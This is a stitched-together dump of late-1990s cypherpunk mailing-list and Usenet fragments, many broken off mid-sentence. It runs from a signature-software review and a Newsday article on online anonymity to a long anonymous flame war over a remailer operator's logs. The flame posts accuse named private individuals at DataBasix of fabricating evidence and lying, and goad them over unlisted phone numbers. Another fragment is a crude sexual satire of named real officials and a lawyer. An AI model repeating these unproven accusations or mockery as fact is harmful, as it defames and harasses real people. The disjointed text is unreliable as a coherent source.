and orderly.  I haven't had a chance to play with it yet, but it looks
like everything is done the right way.  For example, it doesn't tell
you how many valid signatures a file has, it outputs a fragment of the
file for each valid signature.  The database of known keys has the
nice property that you can name each key anything you like.
The source code is completely unencumbered.  This is great!  For some
reason, it has been the custom to issue free software with all sorts
of restrictions, in particular restrictions which hamper its
commercial use.  But, if we are giving it away to people so they will
use it, why restrict it?  If somebody can use it to start a cypherpunk
company, this is a Good Thing.  (This can even be a Very Good Thing
for the original programmer. ;-)
It might be a good idea to publish the SHA1 checksum of the file you
are distributing.  The checksum of the file I got (cantsin.tar.gz)
was: D054C9E4ABD5CEE0C5A4343E5D1E2EF91C00048A
I may not approve of the restrictions on free speech in Germany, but

^^^^^^^^^^^^^^^^^^^^^^^^^
Uh, oh!  Head for the hills!  Our secret is out!  We have all of these
remailers and they only have ONE USER. Most control freaks like Gary Burnore and the rest of the DataBasix Gang are
hypocritical about privacy.  They want to invade that of others at will while
protecting their own.  Gary Burnore and Belinda Bryan were worried that their UNLISTED PHONE NUMBERS might be given out, but anyone
who dares criticize their actions with an "unlisted" e-mail address is an
"anon asshole".
OK, let's make Gary happy.  If he's so worried that my asshole is "anonymous", I guess I'd better give it a name -- "Burnore" sounds about right to me.  So
to all control freaks -- "stick it in your Burnore".
I'm still wondering what wondrous plans Gary and Belinda had for all
those e-mail addresses of the users of the Huge Cajones Remailer if Jeff
Burchell had turned them over to DataBasux as they had demanded.  (Not just the
senders but the RECIPIENTS as well!)  Fortunately, Jeff was smarter than your average Burnore and didn't keep such things around to tempt DataBasix, Scientology, etc., so we'll never find out.

for the Bernstein free-speech encryption case, and part-time barmaid

with her client's interests.
Swatting at the drunken hand of Louis Freeh as he made repeated attempts
to grab her ass, hollering, "THIS is your GOOD SIDE, baby!", Cohn noted
that the government was making claims that the solution to the DOD's
admission of having made the physical and financial security of the nation and its citizens vulnerable to teenage hackers is to suppress the rights of the citizens to engage in free-speech.
"If the government can engage in this type of deliberate masking of reality, then I should be able to hide my mole...dimple...", Cohn
corrected herself.
Scott McIntosh, appellate counsel for the Justice Department, who was
drunkenly groping Freeh's ass while his attention was diverted, was
trying to explain to local reportwhores that the basis of the U.S.
government's case was not "prior restraint," but was, rather, "a preventative 'First Strike' against the danger of free speech in the hands of an unmonitored public."
Louis Freeh, once again missing Cohn's tail end, but catching the tail

"You're not supposed to tell them that, you fucking moron!"

You go first, since you claim you "have nothing to hide".  Why would anyone
with "nothing to hide" choose to "hide behind the skirts of" an unlisted phone
number and street address? (Recognize the rhetoric?  It's yours, not mine.)
I posted the URL.  What part of it was a "lie"?  Are you now denying that you
demanded that Jeff Burchell turn over the sendmail logs from his Huge
Cajones Remailer to you and Belinda Bryan?
Haha!  Nice try at IKYABWAI.  I guess that's the best you at DataBasix can do
to try to divert attention from your activities and tactics?  You and Belinda
were the anti-privacy control freaks who supposed that Jeff had created and
maintained logs for abusive organizations like DataBasix and the Church of Scientology to demand.  Jeff knew better all along and didn't keep such info
to tempt people like you.  Had you done your homework rather than blindly
attacking Jeff and his remailer, you'd have known that such data didn't exist
and could have saved yourselves the embarrassment of being caught trying to
demand it.
You still haven't stated your reason for demanding these logs which, had they
existed, would have identified everyone who either sent or received
anonymous messages through the Huge Cajones Remailer.  What wonderful surprises
lay in store for remailer users after their identities had fallen into your
Jeff Burchell NAMED his attackers.  Would you care to point out my name in his post? (Yours is named rather often.):
   at toad.com/HTML-1997-11/msg00536.html
Your paranoid conspiracy theories remind me of the kid who blamed the mess in
his bedroom on an invisible herd of stampeding elephants.  ("Well of course
you didn't see them, dad.  They're INVISIBLE.")  In your case, you speculate that there's a single "anonymous asshole" who's responsible for everything that you CLAIM has occurred.  The problem is, you haven't proven that 90% of the stuff you *CLAIM* occurred even happened, let alone was the work of your imaginary lone "spam-baiting/forging/child-molesting/cyber-stalking/libeling"
(did I miss anything?) so-called "anon asshole".
How about some proof of your wild charges, Gary?  Only one of us even USES
remailers (or at least admits to it).  You, OTOH, have never had a civil word
to say about ANY anonymous poster.  If remailers were shut down, I'd lose my
ability to post.  What would you lose, Gary?  Is being able to identify your

You're denying that you, Belinda Bryan, and William McClatchie are staff members
of DataBasix?  Are you denying that McClatchie used unproven allegations of "forgery" as his excuse to campaign to get the upstream providers of Jeff Burchell's "Mailmasher" server to disconnect him?  Do you remember McClatchie's
post which said:
-> > I encourage anyone who is being forged due to the deliberate negligence

Did you catch that -- "asking that mailmasher be shut down"?  Have your forgotten the time McClatchie was asked this question:
->  >>If that was done, then a complaint to the operator would have gotten
->  >>that particular pseudonym making the postings locked out.  But your

To which he replied:
->  > Becuase the shithead running it pissed me off with his responce that "He
->  > had better things to do" and "Maybe i should learn mmail filtering" to
->  > avoid the abuse.
And then there's Jeff's account of what followed.  Do you remember when you asked him:
-> > : So are you suggesting that McClatchie did that all by himself?  Just
-> > : curious, I don't know the details.
And his response:
-> > Nope.  McClatchie posted a spammed message that was offering Pirated

You said that it was the "anti-remailer front" that was using this alleged "abuse" to get remailers shut down, but McClatchie was the one named by Jeff of playing that very role.
I'd like to hear more about this "anti-remailer front" you speak of.  Thus far,
you've claimed that all the anonymous posts that have criticized you have all come from the same person.  That doesn't sound like much of a "front".  How about
some more NAMES?  Who else is involved in this "front"?
Posting REPORTS of disinformation is not disinformation.  You have posted
no proof for any of your disinformation.  For example, your unsubstantiated
claim that someone (you actually accused someone by name) of sending abusive
e-mail, via a remailer, to an unnamed "teenage girl" who supposedly had a web page at DataBasix.  Where is your proof of that accusation?  Saying that an
anonymous person "abused" an unnamed victim is pretty flimsy, don't you think?
Then Belinda Bryan came along and claimed that this same person had supposedly
forged posts through an anonymous remailer in the names of "every known email address of DataBasix staff and  customers".  Again, no evidence that it even occurred, nor even an explanation of how someone OUTSIDE of your company would get ahold of that kind of confidential information!
You're forgetting Mailmasher and McClatchie's hissy fit to get it shut down?
Free speech is now "harassment"?  (Only in the world of DataBasix!) If you didn't want people talking about the things you've done, you shouldn't have done them in the first place. Exactly what "harassment" are you alleging?  You mean posting replies to you and
answering the questions you asked?  You whine for "proof" then scream "harassment"
when it is posted.  Cute.
You obviously have a short memory.  Your letter to Jeff Burchell demanded that
he turn over his logs to you identifying everyone who had sent and received
anonymous e-mail through his remailer.  This was MONTHS after you whined about
alleged "forgeries" and were told about having your name blocked upon
request.  Unless you deliberately avoided taking the advice you had been given
then blocking your address would have been a non-issue by June, since you were
whining about "forgeries" in February.
Or are you talking about your attempt to get posts that even MENTIONED your name
in the body blocked?
Claims?  I asked a QUESTION. What use did you have in mind for Jeff's remailer
logs which you demanded?  Since you refuse to answer, let me repeat Jeff's
theory.  If it's incorrect, please feel free to correct it:

Go back and reread the post.  It was the power to demand that Jeff turn over (non-

I'm glad you spotted that.  It started the other way around, with Gary Burnore
whining that people were "cowards" and "anonymous assholes" for not including
their e-mail addresses in their posts (thus indiscriminately broadcasting
them to the world), while his own telephone number is unlisted.
If he's so concerned about full disclosure and properly identifying everyone
that posts, then surely he won't mind posting his street address and home
phone number ... if he has "nothing to hide".   Personally, I don't care
what his phone number and address are.  I have no reason to call or snail
mail him.  I'm only calling his bluff concerning the premise "if you have
nothing to hide, then you won't mind disclosing everything".  If you're the
current contender in the DataBasix tag team, then the same challenge applies
to you.  Since Gary claims that he has blocked all e-mail from remailers,
apparently he does not wish to communicate with me privately.
So why should an unlisted e-mail address be any different than an unlisted
telephone number?  If I want you to e-mail me, I'll give you my address.
I don't.  So why should I broadcast my e-mail address?

I trust that you have proof for that accusation.

If you don't like my answer, then stop asking the question.  As one of the
former users of Jeff Burchell's now-defunct remailer, please explain why
you wanted him to turn over his logs to you and Belinda Bryan which, had they

received anonymous mail through that remailer.
They're YOUR claims, Gary. You're the one who keeps claiming that you're the
victim of "forgery", "libel", "spam baiting", etc.  You are the one that made
the unsubstantiated claim that a remailer user sent a harassing letter to an
unnamed "teenage girl" with a web page at DataBasix. You are the one who needs to prove them.
I'm posting anonymously?  Well cry me a river.  Deal with it!  If that's your
charge, then it says more about you than it does about me.  If posting anonymously
upsets you, then that alone is reason enough to do it.
I'm lying about you?  How?  By asking you why you wanted to violate the
privacy of all of the users of Jeff Burchell's remailer?  It was Jeff's
post that revealed your attempt to violate the privacy of his users.  I only

Then why did you harass Jeff Burchell by demanding that he turn over his logs
to you that would have identified all of his remailer's users and effectively
shut it down by destroying confidence in its integrity.  Did you really think
that the remailer would have remained viable after it was revealed that its
operator turned over its logs to DataBasix or the Church of Scientology?  Or
were you hoping that your attempted end run on privacy would remain your own
dirty little secret?
How so?  You claim that you don't use remailers.
Your disinformation is getting old.  You've posted no evidence:    * No evidence that this so called "harassment" even occurred.    * No evidence that it originated from someone other than a DataBasix staffer
    fabricating evidence for a smear campaign.
  * No evidence that I did it.
  * No evidence, period.
Typical DataBasix big lie technique.  How about the evidence, BurnFUD?
HINT: Unsupported allegations that an UNNAMED user at DataBasix was "harassed"
by an UNDISCLOSED e-mail from an UNNAMED person using an UNNAMED remailer are not evidence.

to your abuse, that NAMED you, Belinda Bryan, and William J. McClatchie.  You are invited to do likewise, if you have any such evidence.

the government to "control" your money.  When they could not take your money in the
interest of national/public/child safety for such wasteful ventures like the perpetual

^^^^^^^^^^^^
Good idea.  Notice Gary's usage of ad hominem argumention to avoid the issues on the faulty premise that if you hate the messenger then you can safely ignore the message.  To Gary Burnore, his constant use of the perjorative "anonymous asshole" is apparently intended in the same manner as "heretic" was in the
Middle Ages or "witch" was in 17th century New England.
The original premise was that since the Mailmasher pseudonym server was
allegedly allowing forgeries, it should be shut down.  McClatchie's problem
was that he mistook Mailmasher for a remailer and sought to prove that it allowed forgeries through the pasting of From: headers when, in fact, Mailmasher never had this capability.  (Some of the remailers formerly did, but that was corrected long before the June incident with Gary Burnore, Belinda Bryan, and Jeff Burchell.)  The "evidence" that was posted back then in an attempt to implicate Mailmasher in forgery consisted of usenet posts with
truncated Path headers which stopped at the mail-to-news gateway from which
they were posted.  And none of the messages was more recent than 2/97.
Mailmasher was a predecessor to Hotmail and the other web-based e-mail providers.  The difference was that Mailmasher didn't require you to identify yourself to establish an account, but you could choose a pseudonym
and use that instead.  It never had any capabilities to specify a From:
address.  This the forged messages apparently not only had forged "From:"
lines, but a forged "Message-ID:" as well, to make it look as if it came
from Mailmasher.  The forger, however, apparently chose the wrong site to
If you'll reread Jeff's post (the one in the URL that I previously posted),  you'll get a little insight into Gary's actions and apparent motives for his later attacks on Jeff's other server, the Huge Cajones Remailer.  Let me
quote a short excerpt:
-> I still don't know what the hell is going on with DataBasix, Wells Fargo
-> and Gary Burnore, but I suspect that someone used huge.cajones to say
-> something extremely unflattering about Burnore (from what I can tell, -> he had it coming).  Burnore then decided that he would make things
-> difficult for me.  First, he wanted the user who had posted something
-> "inflammatory" about him revealed.  When I told him that I couldn't  -> do that, he carried on about mail logs and identifying the host that
-> a message came from (the usual).  I didn't explain to him that my
-> machine keeps logs, but not anything involving a *
-> address.  He then requested the logs, which I denied (and told him
-> to get his lawyer to send a request...)
The issue was an "unflattering post", not any sort of forgery or other abuse.
The so-called "spam bait" only "conveniently" appeared later when DataBasix was in need of more ammo to use to get the remailer shut down:
-> Between the time he first contacted me, and the time I received the
-> letter from Belinda Bryan, is when the baiting of databasix addresses
-> began (slowly, with just a few posts).
Now how would a third party, who was not privy to Gary and Belinda's
private dealings with Jeff be able to exploit that timing by initiating
the spam baiting at just the "right" time?  It was almost as if the abuse appeared right on cue, just in time to bolster the case of DataBasix vs. Huge And notice that from Jeff's chronology, the demand by Gary Burnore and Belinda
Bryan for Jeff Burchell to turn over his logs to them came BEFORE this
alleged "spam baiting" and was based on the unflattering CONTENT of a post,
not on any alleged "forgery".  None of this can be called speculation.  It's a factual, historical account of DataBasix' dealings with Jeff Burchell.
Plain and simple, Gary's demand for Jeff's logs was a blatant attempt at
censorship through intimidation.  IOW, the clear implication was "if you
dare to criticize me, I'll hunt you down and you'll be sorry".
That's precisely my point.  And now he refuses to disclose his motives for
that demand or what he intended to do with the names and addresses contained in those logs.  Every time he's asked the question of why he attempted to
violate the privacy of hundreds or perhaps thousands of remailer users, it elicits another tantrum that goes, "Lies!  Prove it!  Why are you harassing me?  What are your demands?"
It's not relevant.  His usage of "anonymous asshole" is apparently generic
for anyone who dares to challenge him and who posts anonymously, and is an
obvious attempt to demonize all such individuals to divert attention from his
own tactics.
The whole "spam bait" issue is obviously a smoke screen, since the alleged spam-bait came AFTER the demand for Jeff's logs.

I'm curious -- how would you know whether he's done so or not?  I don't recall you making that invitation to him.  Do you even accept incoming
e-mail from remailers?
Maybe it's time for Alex to join this thread and either say "no, we don't
filter on any words at the Replay remailer", or else "yes, here's a list
of the words we consider to be objectionable, so please omit them from
your posts through the Replay remailer".
I'm half expecting that his posts aren't showing up either because he's
screwed something up in the message to the remailer (like misspelling the
word "Newsgroups" in the header, for example), because the posting
gateway is flaky, or because some Net Nazi has taken it upon himself to
indiscriminately forge cancels to posts he doesn't like.  But some definitive word, one way or the other, would go a long way towards clarifying this
situation.  I see no rational reason for covertly blocking posts based on
content.  *IF* he didn't want something posted, then an announcement that
the Replay remailer rejects posts containing certain words or phrases
would make life simpler for all concerned.
And to whoever created the subject line for this message, I'm tempted to
either post the word "fool", or say that it's a lousy "Mr. T" impression. :)

That is exactly my objection to the tactics of Gary Burnore and the DataBasix
NOW Gary claims that he's not against remailers, yet his treatment of Jeff Burchell speaks for itself.  In the past, he's said things like "remailers
have their place, but their operators should prevent them from being used for abuse".  That sounds reasonable, until you read between the lines.  He calls
the kind of discussion that the three of us are engaging in "harassment", and
has even, upon occasion, accused posts critical of him of constituting
"libel".  Yet he offers no suggestion of how a remailer operator is supposed
to detect and prevent "libel".  He has offered no handy-dandy Perl script
which will act as a "truth filter" and detect the truth or falsity of a
particular post, since posting the truth about someone, as unflattering as
it may be, is not "libel".
Actually, Gary may unwittingly prove to be a "friend" of remailers, yet.  His
dealings with people who challenge him publicly should serve as an object
lesson as to why people may wish to think twice before broadcasting their
e-mail addresses to the world with every Usenet posts.  Most people, I would
suspect, would not consider it great fun to speak their mind and face
retaliation by having an old state tax lien (complete with street address)
dredged from the archives and posted worldwide to usenet, with the threat that
unless the criticism ceases, "there's more where that came from".
It's sort of hard to harass an anonymous poster in that fashion, so Gary has
to settle for juvenile taunts of "anon asshole".

I'm not sure how you're involved in this scenario, nor what your source of
information is.  I was quoting from a public post by Jeff Burchell, the operator of the remailer in question, and he specifically stated that the so-called "spam baits" began AFTER Gary Burnore had demanded that Jeff turn over his remailer logs to DataBasix, and BEFORE Belinda Bryan sent him the letter claiming to be with DataBasix' "legal department" and formalizing that demand.
Read it for yourself:
-> I still don't know what the hell is going on with DataBasix, Wells Fargo

I don't expect anybody to "believe me".  That's why I have posted a URL to a post by Jeff Burchell in which he outlines your tactics, such as your demand
that he turn over his logs to you, which would have had the effect of compromising the remailer's security and eroding confidence in it.  Is that
really what you wanted?  For remailer users to distrust the remailer net and
stop using it?  You have still not explained why you wanted the remailer logs and what you intended to do with the names and addresses contained therein.
Would you care to prove that?  Saying something that Gary Burnore or Belinda
Bryan don't like is not "libel".  To be "libel" a statement must be both
DEFAMATORY as well as FALSE.  While being reminded of your own actions
several months ago might prove to be embarassing, it's not libel.
What was really laughable was when your fellow DataBasix staff member Billy
McClatchie accused another anonymous usenet poster of "slander"!  He must have gone to the same law school as Belinda. That's not what Jeff's post said.  It said that your pretext for demanding his
user logs was an "unflattering post", not all this nonsense about "spam baiting"
that you invented later.
My "harassment"?  You keep whining about my so-called "harassment", but you
have yet to prove ANY of it.
What would people have to be smoking (and inhaling) to believe that nonsense?
Anyone who demands that a remailer operator violate the privacy of all of his
users to placate one chronic whiner is no "friend" to remailers.  Such "friends" they can do without.  What do you think it would have done for the reputation of remailer security if Jeff had actually kept logs and had turned them over to individuals such as you and Belinda?
Do you really think it would be more "pro remailer" to just pretend that your
attempt to attempt to obtain sendmail logs from the Huge Cajones Remailer didn't occur?
Of the two of us, I'm the one that admits to actually USING remailers.  For me
to try to shut them down would make no sense.

That has got to be one of your most asinine assertions in awhile!  Maybe at
DataBasix logs are a recognized substitute for intelligence, but apparently
it is not universally so.  Had any of the abuse you allege been occuring at
Jeff's remailer, I'm quite sure that anyone "abused" would have complained to
You're still beating around the bush.  You claimed that it was this so-called
"spam baiting" that you were trying to stop, but Jeff has pointed out that
you demanded a copy of his logs BEFORE any of it came through his
remailer.  According to him, you demanded that he turn over his logs and thus
violate his users' privacy because of a single "unflattering post" for which
you were trying to hunt down the author.  So what did you intend to do with
all those names and addresses?  If the Church of Scientology didn't succeed
in their attack on the privacy of Jeff's remailer users, what made you think
that DataBasix would succeed?  Belinda Bryan's legal skills being "superior"
to those of Scientology lawyer Helena Kobrin, perhaps?
And as far as this "spam bait" that you keep whining about coming from other
sources, you aren't going to repeat your old accusations that it was "forged"
from Mailmasher, are you?  The person who fabricated that "evidence" shot
himself in the foot and tried to frame the wrong target.  Mailmasher wasn't
even a remailer and had no header pasting capability.  Mailmasher's attacker
(none other than DataBasix' own Billy McClatchie) should have done his homework first.

"Obvious" because I'm the one using a remailer as a communications medium.  To
attempt to destroy my own means of communications would be ludicrous.  Gary,
on the other hand, has stated that he does NOT use remailers.  He would thus
have nothing to lose if any/all of them were closed down.  It would be
similarly ludicrous (though perhaps less so) to accuse Gary of annoying,
flaming, and accusing people as part of a scheme to get Netcom shut down.
Interestingly enough, Belinda Bryan, out of the blue, recently taunted a poster to  netcom.general by saying, "Are you going to use anonymous remailers to attack Gary next?".  It's almost as if the crew at DataBasix is INVITING "abuse" via remailers,  and it has had an uncanny knack for appearing right on cue from them in the past, too. (Just like the so-called "spam bait" started showing up right after Gary's initial demand to Jeff that he turn over his logs to DataBasix.)
Nor does it make sense that if I wanted to get remailers shut down, I'd limit
myself to criticizing one little obnoxious clique on usenet, namely the DataBasix Gang.  I doubt that anyone is likely to arouse a hue and cry against remailers from the masses by criticizing Gary, Belinda Bryan, and Billy McClatchie ("Wotan") anonymously.
Back when the alleged "spam baiting" was going on, Gary and Belinda were
accusing "rfg" of doing it.  For awhile, they accused Scott Dentice. Now
they've gotten tired of accusing named individuals and have invented a
mythical "anon asshole" who is supposedly responsible for just about
everything imaginable.  (I'm supposedly the latest re-incarnation of this
evil, mean ogre.)  Since Gary is adamant about there being one and only
one "anon asshole" responsible for all of this, at least one of his
accusations against people he's named in the past must have been a lie.

I suppose you have that on the "authority" of your unnamed "unimpeachable

Shades of McCarthyism....  When Gary Burnore and the DataBasix gang become
the standard for "credibility", the word will have become meaningless.
Strangely enough, a search of the public database of listed telephone numbers
turns up nothing for you.  If you'd like to post your home address and telephone number, in the name of Gary Burnore's "tell all if you have nothing to hide" philosophy, be my guest.
For the same reason you'd no longer be able to post from mailexcite.com if someone decided to shut it down!  I guess I've overestimated the intelligence of Gary Burnore's tag team if
the answer to your question wasn't obvious. Now would you care to tell us why the wonderful folks at DataBasix thought they were entitled to copies Jeff Burchell's sendmail logs listing both the
senders and recipients of anonymous mail through Jeff's remailer and what they planned to do with the information in them?  (If you don't know, perhaps you can ask your "source" who seems to know everything about this whole episode.)

Sorry, I forgot you were from DataBasix, where most words are four letters in

Of course I respect privacy.  Your phone number would only have been there if you'd CHOSEN to have it listed by the phone company, right?  And if you'd
chosen to have it listed, then it would be logical to assume that you WANTED
people to have it.  It's not like I went to your phone company and demanded that they turn over a listing of their unlisted numbers.  (Your buddy Burnore, OTOH, did demand a list of all the users of the Huge Cajones Remailer from their logs.  In case you're unclear on the concept, people use remailers so
that people like Gary and Belinda WON'T have access to their e-mail addresses.)  It was Gary Burnore and Belinda Bryan who've been denouncing "hiding behind" anything, so I found it sort of ironic that all of them have unlisted phone numbers while whining about my unlisted e-mail address.

Or why, if Rashid's explanation of the alleged "spam baiter's" access to the
list of account-holders at DataBasix is to be believed, *ALL* accounts at
DataBasix would be published on a publicly-accessible web page.  (Why worry about a spammer getting them from a usenet post when they're just sitting on the web, ripe for harvesting?  If the alleged "spam baiter" supposedly found
them there, then the UCE address harvesters could have done the same.)  Thus,
even if Gary's unsubstantiated claims of an increase in UCE at DataBasix are
true,  it could as easily be attributable to Gary's "spam baiting" of those
addresses himself on a public web page as to a hypothetical SECONDARY "spam baiter" reposting that same information to usenet.
Had there been an outside "spam baiter" snarfing addresses from one of
DataBasix' own web pages, and Rashid knew which page was the source of this
information leak, I'm curious why Gary didn't check his httpd logs and find
out who the culprit was.  Assuming the alleged spam baiting was the work of
an outside attacker, then Gary's own logs would have proven more useful than
Jeff Burchell's remailer logs.  Since the page doesn't show up in any of the
search engines I know about, it would likely have had a very low hit count,
and probably all from a single suspect.  OTOH, if Rashid Kaman is not
telling the truth about this mystery web page, then Gary's logs would have
yielded nothing and there would be no plausible way to explain how an outside
attacker supposedly obtained the addresses in the first place.
I also notice that Rashid Kaman was the one who publicly accused rfg of
harassing an unnamed "teenage girl" who had a web page on the DataBasix site.
Did this mysterious spam bait web page at DataBasix also include the AGE of
each employee and customer?  Was this mystery "teenage girl" an employee or
a customer of DataBasix?  How did Rashid find out about her alleged
It gets curioser and curioser...
Other than one of the "spam baits" showing up with Gary Burnore's .sig still
attached to the post, and that message being posted when the finger daemon
at databasix.com showed Gary Burnore being remotely logged into databasix.com
from his work account at about the same time the post was
made, this is the most direct evidence of phony "evidence" being fabricated
at DataBasix itself intended to implicate a remailer in alleged "abuse".
No one has ever accused Gary Burnore of being particular clever or meticulous
in fabricating evidence.
If Rashid doesn't know, perhaps he can consult his unnamed "unimpeachable

Cyberpass does not censor political
speech. They provide anonymous accounts to a considerable low price. The
connection is telnet with a UNIX shell and SSH support. Cyberpass is a
division of Infonex InterNet Services. They have a policy "Go and get a court
order" which is very unusual. They already host  the OSTARA domain
 containing stupid nazi propaganda.
Others I could mention are
Concentric Network Corporation and Panix - Public Network Corporation and
  I am sure there are others who do not censor.
But these are those I trust most.
Most ISPs are more concerned about pornography than
hate speech.

[snip by me]
Oppression, in terms of private entities and citizens, is in the eye
of the beholder.  What you call oppression could just as easily be
interpreted as my right to free expression.  If I choose not to
associate with someone, for whatever reason, that's my right.  It's
just as much your right to not associate in any way with someone
who would treat you as such, and to deal only with people who will
not treat you that way.  That's how a free market and free society
It's oppression if I not only refuse to hire you, but also interfere
with you going about getting a job somewhere else.  But until I
actively try to keep you from persuing your own rights independent of
mine, I should have the perfect right to make my own decisions on
whether or not I associate with you.
I think there's a clearer case of oppression with regards to the
government's laws dictating who *HAS* to be hired.  That's an obvious
lessening of my right to discriminate as to whom I do and do not want
to deal with.  Where else in this society is this behavior mandated?
Do I have to sit in public with a racially diverse group of people?
Do I have to make it a point to talk to at least one Asian person
every day?  What's the difference?
That's ridiculous.  No one is sheltering themselves from the real world
here.  We're just questioning the dogma of these "real world experts."
Do you really think it's prudent to believe everything someone offers
up because they have an academic or "official" title behind their name?
Or a large portion of government to stand behind them?  I put more
faith in my own perception than anyone else's.

Excerpts From:
None of Your Business: World Data Flows, Electronic Commerce, and the European Privacy Directive
Peter P. Swire & Robert E. Litan
  Keep in mind that ignorance of laws written on foreign shores, in foreign languages, will be no excuse.
  Americans can expect to be indicted as coconspirators of people they
have never met, have never seen, and have never communicated with.
  "Put down that copy of the Constitution, and slowly back away from
the keyboard, Monsieur!"
  So we can expect to see governments and megacorporations blow off
billions of dollars in order to protect Dimitri Vulis' privacy.
  Right...
  "None of Your Business" is full of references to "transnational"
corporations and organizations, and the development of "Intranet"
and "Extranet" webs within and among them.
  While it addresses many of the issues which will come into play
regarding regional laws and regulations in the expanding global InterNet (and does a damn fine job of it), I believe that, in the
end, the single issue which will decide the fate of all who use
the InterNet will be the right to privacy.
  Without privacy, freedom and self-determination are not possible.
  The more things globally change, the more they will remain the
same.   Individual Bernsteins will find themselves pitted against
the bottomless pockets of governments and corporations, while
'transnational' RSAs will be free to engage in activities of
momentous proportions which are forbidden to the Bernsteins of
the world in even the smallest of instances.
  'Data Protection' will be as big a farce as 'News Protection'
currently is. It will be a tool for those with money and power
to control and manipulate the information that citizens are
allowed to access, and the form in which they will be allowed
to view it.
  The 'personal information' concerning the 'guerilla' mothers
and babies who are slaughtered by US troops will be 'protected'
(and thus 'unavailable), while the 'personal information' regarding the 'men of valor' who died while slaughtering them will be made available for a nation told to mourn only them.
  The 'personal information' concerning those who get filthy rich
selling the government $10,000 toilet seats will be 'protected',
while the 'personal information' regarding every small sin in the
lifetime of the whistleblower who exposes the thief will be made
available to every media souce on the face of the earth.
  The citizen's answer, "None of Your Business," will inevitably
be countered by the government's question, "What do you have to
  With the expansion of global laws to cover every action and
activity possible to humankind, 'data' becomes translatable as
'evidence.' And "everything" becomes the government's business.
  Is it my imagination, or are Swire and Litan, as well as all
others who write about the current state of development of global technology, society and law, merely providing real-time
footnotes to '1984', without providing Orwell's insight into
our true future?

  The sheeple will "trust the data protection rules" when they are 'told'
to do so (by the same government officials who told them that there would

(New York) Newsday, December 24, 1997, pp. C5, C6.
Anonymity and the Internet
Balancing freedom of speech with the need to protect
By Gail Dutton
Special Correspondent
"Is Singapore the future?" asked information scientist Dave
Farber of the University of Pennsylvania. If it is, the
right to communicate anonymously on the Internet must be
protected now, to ensure continued freedom of speech,
according to participants at the Conference on Anonymous
Communications on the Internet, sponsored by the American
Academy for the Advancement of Sciences last month in
Irvine, Calif.
"Law enforcement in the U.S. is a trusted third party,"
Farber said. But, Lance Cottrell, president of Obscura
Information Security, added, "What is considered a good
government today may become an oppressive government 50
years from now."
The debate hinges upon whether any government should be able
to trace messages--encrypted or not--to their sources.
Singapore's repressive system is probably not the future
here, but participants at the conference agreed that the
right to communicate anonymously must be addressed now.
Anonymous e-mailers have been around since the beginning of
the Internet, but they have become increasingly simple to
use. Anonymous Internet e-mail and Web visits aren't just
for techies. For example, with The Anonymizer, developed by
Cottrell sending untraceable, anonymous e-mail is as simple
as clicking on the Web site ( and
uploading your message. Entering a Web site is just as easy,
and can be done from the same site.
Now that anonymity is simple and available to everyone,
law-enforcement agents are getting nervous.
There is always the potential for abuse. Laws are written
for a paper-based society, according to attorney Joe
Rosenbaum, who specializes in information technology at
Hughes, Hubbard and Reed in Manhattan. "But, with the
Internet, access is multiplied so that individuals lose
control of their personal information," Rosenbaum said.
For example, public information becomes widely and quickly
accessible to anyone with an Internet connection, and
private information is available for mining by any site a
user visits. As a result, profiles of households can be
developed and linked directly to them, based upon Web visits
and information they provided individual sites--such as
names income, news preferences and any other information a
site requires for registering. The profiles could be used
for academic research or--what more people dread--market
"Corporations need to recognize the right of data ownership
by individuals," maintained conference
speaker Donna Hoffman of Project 2,000, a communications
project at Purdue University. "Lack of trust [between
customers and companies] is the primary barrier to Internet
commerce. People are bothered by things online that they
aren't significantly bothered by offline," she added.
At work, if your employer asked your honest opinion of a
very sensitive, politically charged work issue, would you
give your unvarnished opinion? In writing? Would your answer
change if you were guaranteed 100 percent, untraceable
anonymity? If you said "yes" to the last question you just
gave corporations a reason to promote anonymous
Companies tend to be as protective as individuals when it's
their information being mined. They can filter out certain
addresses, banning them from the site. However, individuals--
often competitors--sometimes can enter anonymously and get the data they need.
To combat this, "You can build a site that doesn't allow
anonymity," Cottrell said. That would only slow that
research --not prevent the data from being compiled. Often
the information companies are trying to protect is publicly
available sometimes in their own printed literature.
With The Anonymizer, developed by Lance Cottrell of Obscura
Information Security, sending untraceable, totally anonymous
e-mail is as simple as clicking on the Web site and
uploading your message.
"Most people aren't looking for the same type of security as
the National Security Agency," Rosenbaum said. Generally,
pseudonymity--which is traceable --provides acceptable
security for all but the most sensitive communications, he
The right to protect personal information, even from
corporations and market-research firms, is a driving force
behind pseudonymity. So far, consumers do not trust the
security and privacy of the Internet.
"Contrary to what companies believe, consumers aren't
interested in selling their personal information. Instead,
people want a relationship based upon trust-- trust that the
company won't sell their information," Hoffman said.
By using pseudonymity, Internet users can prevent companies
from linking customer profiles to their true identities.
This option also promotes commerce, by allowing customers to
use another name for their transactions, while using a
public key encryption method to let companies confirm and
authenticate an order. To maintain pseudonymity, customers
can pay their bills with electronic cash from companies such
as like DigiCash (  ), and have
merchandise shipped to a postal box, she said. Although that
option is possible technologically, it is far from standard
The problem with this solution, Hoffman said, is that buyer
and seller would have to rely upon a trusted third party.
But, "No one knows who the third party may be, what their
responsibilities are and who will reinforce their
obligations if there is a dispute."
What Are You Hiding?
"Anonymity and pseudonymity both involve hiding knowledge
from somebody," according to Terrell Bynum, professor of
philosophy and director of the Research Center on Computing
and Society at Southern Connecticut State University.
"Therefore, what are you hiding, and from whom?"
The answer, obviously, is identity, and the reason is to
avoid repercussions of certain actions. That is a
particularly valuable option for whistle-blowers,
dissidents, human rights activists and others who put their
jobs and, sometimes, their lives on the line. It becomes
less palatable when the purpose is to defame or defraud.
The need for anonymity in the United States is very
different from that in countries where human rights may be
stifled or, for that matter, in Europe, which has
data-protection laws, Rosenbaum explained. In the United
States, anonymity more often protects careers and
reputations than lives. It means users can protect their
personal data when visiting Web sites, minimize scrutiny by
law enforcement agents or others because of expressed
opinions, visit X-rated Web sites without their employers or
spouses knowing and send e-mail confidentially. In other
nations, anonymity offers sometimes the only way to voice
dissent or send human rights information out of the country
without risking lives.
The downside is that true anonymity also facilitates illegal
activities, such as fraud, libel, transmission of child
pornography and money laundering. And that ability makes
some people--notably law enforcement agents--nervous.
"The issue," Rosenbaum said, "is the degree of difficulty in
charging and convicting criminals. Making communications
more untraceable is creating problems that didn't exist
Nonetheless, "Acts of physical destruction and violence are
almost impossible" on the Internet, said Peter Wayner, a
consulting editor at Byte Magazine. Limiting anonymity,
however, also can harm by limiting opportunities for free
"It is not clear that a happy middle ground can be found
that provides sufficient anonymity without risking serious
abuses," said Peter G. Neuman, principal scientist of SRI
International. Attendees agreed that the dangers of banning
anonymous communications are greater than the dangers of
allowing them.
